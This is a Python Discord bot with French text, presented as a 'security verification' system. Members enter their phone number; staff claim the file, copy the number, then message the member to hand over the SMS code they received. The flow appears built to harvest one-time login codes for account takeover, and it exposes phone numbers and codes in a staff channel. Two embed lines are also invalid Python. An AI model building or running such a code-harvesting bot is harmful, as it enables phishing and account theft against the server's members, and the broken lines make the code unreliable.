from flask import Flask
from threading import Thread
import discord
from discord.ext import commands
import os

# --- SERVEUR WEB FLASK POUR RENDER ---
app = Flask('')

@app.route('/')
def home():
    return "Je suis bien en ligne !"

def run():
    app.run(host='0.0.0.0', port=8080)

def keep_alive():
    t = Thread(target=run)
    t.start()

keep_alive()

# --- CONFIGURATION DU BOT DISCORD ---
intents = discord.Intents.default()
intents.members = True
intents.message_content = True

bot = commands.Bot(command_prefix="!", intents=intents)

STAFF_CHANNEL_ID = 1530354736866263042
VERIFIED_ROLE_ID = 0  # ⚠️ Mets l'ID de ton rôle vérifié ici

VERIFICATION_MESSAGES = {}
TANA_PINK = discord.Color.from_rgb(255, 153, 153)

# --- MODAL DE RAISON DU REFUS ---
class RefusalReasonModal(discord.ui.Modal, title="Motif du refus"):
    reason_input = discord.ui.TextInput(
        label="Raison du refus (optionnel)",
        placeholder="Ex: Numéro invalide, Code incorrect...",
        required=False,
        max_length=200
    )

    def __init__(self, verification_view):
        super().__init__()
        self.v_view = verification_view

    async def on_submit(self, interaction: discord.Interaction):
        reason = self.reason_input.value.strip() or "Aucune raison spécifiée."

        for child in self.v_view.children:
            child.disabled = True

        embed = interaction.message.embeds[0]
        embed.color = discord.Color.red()
        embed.title = "❌ DOSSIER REFUSÉ"
        
        for i, field in enumerate(embed.fields):
            if "Code SMS" in field.name and "En attente" in field.value:
                embed.set_field_at(i, name="🔑 Code SMS", value="❌ Non fourni", inline=True)
                break

        embed.add_field(name="📌 Statut", value=f"Refusé par {interaction.user.mention}", inline=False)
        embed.add_field(name="💬 Raison", value=f"`{reason}`", inline=False)
        embed.timestamp = discord.utils.utcnow()
        
        await interaction.message.edit(embed=embed, view=self.v_view)

        try:
            user = await bot.fetch_user(self.v_view.user_id)
            embed_mp = discord.Embed(
                title="❌ Vérification refusée",
                description=f"Ta demande de vérification a été **refusée** par le staff.\n\n**Raison :** {reason}",
                color=discord.Color.red()
            )
            await user.send(embed=embed_mp)
        except Exception:
            pass
            
        await interaction.response.send_message("❌ Vérification refusée et dossier archivé.", ephemeral=True)

# --- MODAL POUR LE NUMÉRO ---
class UserPhoneNumberModal(discord.ui.Modal, title="Vérification — Numéro de téléphone"):
    phone_input = discord.ui.TextInput(
        label="Entre ton numéro (10 chiffres)",
        placeholder="Ex: 0612345678",
        min_length=10,
        max_length=10,
        required=True
    )

    async def on_submit(self, interaction: discord.Interaction):
        numero = self.phone_input.value

        if not numero.isdigit():
            await interaction.response.send_message("❌ Ton numéro ne doit contenir **que des chiffres**, sans lettres ni espaces.", ephemeral=True)
            return

        await interaction.response.send_message("✅ Ton numéro a bien été transmis au staff ! Patiente quelques instants.", ephemeral=True)

        try:
            embed_mp = discord.Embed(
                title="📩 Demande reçue",
                description="Ta demande a bien été transmise au staff.\nTu recevras ici la suite dès qu'un membre du staff te demandera ton code.",
                color=TANA_PINK
            )
            await interaction.user.send(embed=embed_mp)
        except Exception:
            pass

        staff_channel = bot.get_channel(STAFF_CHANNEL_ID)
        if staff_channel:
            embed = discord.Embed(
                title="📋 DOSSIER DE VÉRIFICATION",
                color=TANA_PINK,
                timestamp=discord.utils.utcnow()
            )
            
            # Ajout de l'avatar du joueur en miniature
            embed.set_thumbnail(url=interaction.user.display_avatar.url)

            # Format des dates pour le staff
            created_at = interaction.user.created_at.strftime("%d/%m/%Y")
            joined_at = interaction.user.joined_at.strftime("%d/%m/%Y") if interaction.user.joined_at else "Inconnue"

            embed.add_field(name="👤 Utilisateur", value=f"{interaction.user.mention}", inline=True)
            embed.add_field(name="🆔 ID", value=`{interaction.user.id}`, inline=True)
            embed.add_field(name="📞 Numéro", value=`{numero}`, inline=False)
            embed.add_field(name="📅 Compte créé le", value=f"`{created_at}`", inline=True)
            embed.add_field(name="📥 Arrivé sur le serveur", value=f"`{joined_at}`", inline=True)
            embed.add_field(name="🟢 Présence", value="✅ Sur le serveur", inline=True)
            embed.add_field(name="🔑 Code SMS", value="⏳ En attente...", inline=True)
            
            embed.set_footer(text=f"{interaction.guild.name} · Système de Sécurité Tanalounge")

            view = VerificationView(numero=numero, user_id=interaction.user.id)
            msg = await staff_channel.send(embed=embed, view=view)
            
            VERIFICATION_MESSAGES[interaction.user.id] = (msg, view)

# --- VUE DU BOUTON PUBLIC "SE VÉRIFIER" ---
class PublicVerifyView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="Se vérifier", style=discord.ButtonStyle.green, custom_id="persistent_public_verify_btn")
    async def verify_callback(self, interaction: discord.Interaction, button: discord.ui.Button):
        modal = UserPhoneNumberModal()
        await interaction.response.send_modal(modal)

# --- MODAL CODE SMS EN MP ---
class PlayerCodeModal(discord.ui.Modal, title="Entrer le code SMS"):
    code_input = discord.ui.TextInput(
        label="Code SMS reçu (Chiffres uniquement)",
        placeholder="Ex: 4829",
        min_length=3,
        max_length=10,
        required=True
    )

    def __init__(self, staff_message, staff_view):
        super().__init__()
        self.staff_message = staff_message
        self.staff_view = staff_view

    async def on_submit(self, interaction: discord.Interaction):
        code_saisi = self.code_input.value

        if not code_saisi.isdigit():
            await interaction.response.send_message("❌ Le code SMS ne doit contenir **que des chiffres**, sans lettres ni espaces.", ephemeral=True)
            return
        
        embed_mp = discord.Embed(
            title="✅ Code transmis",
            description=f"Ton code (`{code_saisi}`) a bien été envoyé au staff. Patiente pendant la vérification.",
            color=discord.Color.green()
        )
        await interaction.response.send_message(embed=embed_mp, ephemeral=True)

        embed_staff = self.staff_message.embeds[0]
        for i, field in enumerate(embed_staff.fields):
            if "Code SMS" in field.name:
                embed_staff.set_field_at(i, name="🔑 Code SMS", value=f"✅ Reçu : `{code_saisi}`", inline=True)
                break

        await self.staff_message.edit(embed=embed_staff, view=self.staff_view)

# --- BOUTON MP JOUEUR ---
class PlayerCodeView(discord.ui.View):
    def __init__(self, staff_message, staff_view):
        super().__init__(timeout=None)
        self.staff_message = staff_message
        self.staff_view = staff_view

    @discord.ui.button(label="Entrer mon code", style=discord.ButtonStyle.green, custom_id="player_enter_code_btn")
    async def enter_code_callback(self, interaction: discord.Interaction, button: discord.ui.Button):
        modal = PlayerCodeModal(self.staff_message, self.staff_view)
        await interaction.response.send_modal(modal)

# --- VUE DU STAFF ---
class VerificationView(discord.ui.View):
    def __init__(self, numero: str, user_id: int):
        super().__init__(timeout=None)
        self.numero = numero
        self.user_id = user_id
        self.claimed_by = None

    @discord.ui.button(label="Claim", style=discord.ButtonStyle.green, emoji="✅", custom_id="claim_btn_dynamic")
    async def claim_callback(self, interaction: discord.Interaction, button: discord.ui.Button):
        if self.claimed_by is not None and self.claimed_by != interaction.user.id:
            await interaction.response.send_message("❌ Ce dossier a déjà été pris en charge !", ephemeral=True)
            return
        
        if self.claimed_by == interaction.user.id:
            await interaction.response.send_message("❌ Tu as déjà claim ce dossier.", ephemeral=True)
            return

        self.claimed_by = interaction.user.id
        button.label = f"Claimé par {interaction.user.name}"
        button.disabled = True
        
        for child in self.children:
            if not ("claim_btn" in child.custom_id):
                child.disabled = False

        await interaction.response.edit_message(view=self)
        await interaction.followup.send(f"🔒 Dossier claimé par {interaction.user.mention}.", ephemeral=True)

    @discord.ui.button(label="Demander le code", style=discord.ButtonStyle.secondary, emoji="📩", custom_id="ask_code_btn_dynamic", disabled=True)
    async def ask_code_callback(self, interaction: discord.Interaction, button: discord.ui.Button):
        if self.claimed_by and self.claimed_by != interaction.user.id:
            await interaction.response.send_message("❌ Vous ne pouvez pas interagir avec ce dossier !", ephemeral=True)
            return
        
        try:
            user = await bot.fetch_user(self.user_id)
            embed_mp = discord.Embed(
                title="🔒 Code demandé",
                description="Le staff a besoin du code reçu par SMS.\nClique sur le bouton ci-dessous pour l'envoyer.",
                color=TANA_PINK
            )
            view_mp = PlayerCodeView(interaction.message, self)
            await user.send(embed=embed_mp, view=view_mp)
            await interaction.response.send_message("✅ Le message de demande de code a été envoyé en MP au joueur.", ephemeral=True)
        except Exception:
            await interaction.response.send_message(f"❌ Impossible d'envoyer un MP au joueur (ses MP sont fermés ou bloqués).", ephemeral=True)

    @discord.ui.button(label="Copier", style=discord.ButtonStyle.primary, emoji="📋", custom_id="copy_btn_dynamic", disabled=True)
    async def copy_callback(self, interaction: discord.Interaction, button: discord.ui.Button):
        if self.claimed_by and self.claimed_by != interaction.user.id:
            await interaction.response.send_message("❌ Vous ne pouvez pas interagir avec ce dossier !", ephemeral=True)
            return
        await interaction.response.send_message(f"`{self.numero}`", ephemeral=True)

    @discord.ui.button(label="Accepter", style=discord.ButtonStyle.success, emoji="✔", custom_id="accept_btn_dynamic", disabled=True)
    async def accept_callback(self, interaction: discord.Interaction, button: discord.ui.Button):
        if self.claimed_by and self.claimed_by != interaction.user.id:
            await interaction.response.send_message("❌ Vous ne pouvez pas valider ce dossier !", ephemeral=True)
            return
        
        for child in self.children:
            child.disabled = True

        embed = interaction.message.embeds[0]
        embed.color = discord.Color.green()
        embed.title = "✅ DOSSIER ACCEPTÉ"
        embed.add_field(name="📌 Statut", value=f"Accepté par {interaction.user.mention}", inline=False)
        embed.timestamp = discord.utils.utcnow()
        
        await interaction.message.edit(embed=embed, view=self)

        if VERIFIED_ROLE_ID != 0:
            try:
                member = interaction.guild.get_member(self.user_id) or await interaction.guild.fetch_member(self.user_id)
                role = interaction.guild.get_role(VERIFIED_ROLE_ID)
                if member and role:
                    await member.add_roles(role)
            except Exception as e:
                print(f"Erreur ajout de rôle : {e}")

        try:
            user = await bot.fetch_user(self.user_id)
            embed_mp = discord.Embed(
                title="✅ Vérification réussie",
                description="Ta demande de vérification a été **acceptée** par le staff. Bienvenue !",
                color=discord.Color.green()
            )
            await user.send(embed=embed_mp)
        except Exception:
            pass

        await interaction.response.send_message("✅ Vérification acceptée (rôle attribué automatiquement).", ephemeral=True)

    @discord.ui.button(label="Refuser", style=discord.ButtonStyle.danger, emoji="✖", custom_id="refuse_btn_dynamic", disabled=True)
    async def refuse_callback(self, interaction: discord.Interaction, button: discord.ui.Button):
        if self.claimed_by and self.claimed_by != interaction.user.id:
            await interaction.response.send_message("❌ Vous ne pouvez pas refuser ce dossier !", ephemeral=True)
            return
        
        modal = RefusalReasonModal(verification_view=self)
        await interaction.response.send_modal(modal)

@bot.event
async def on_ready():
    bot.add_view(PublicVerifyView())
    print(f"Bot connecté en tant que {bot.user} et vues persistantes chargées.")

@bot.event
async def on_member_remove(member):
    if member.id in VERIFICATION_MESSAGES:
        message, _ = VERIFICATION_MESSAGES[member.id]
        try:
            embed = message.embeds[0]
            embed.color = discord.Color.from_rgb(231, 76, 60)
            for i, field in enumerate(embed.fields):
                if "Présence" in field.name:
                    embed.set_field_at(i, name="🔴 Présence", value="❌ A quitté le serveur", inline=True)
                    break
            await message.edit(embed=embed)
        except Exception as e:
            print(f"Erreur : {e}")

@bot.command()
async def setup_verify(ctx):
    embed = discord.Embed(
        title="📱 Vérification",
        description="Clique sur le bouton ci-dessous pour entrer ton numéro et lancer ta vérification.\nLe staff recevra ensuite ta demande.",
        color=TANA_PINK
    )
    view = PublicVerifyView()
    await ctx.send(embed=embed, view=view)

bot.run(os.environ['DISCORD_TOKEN'])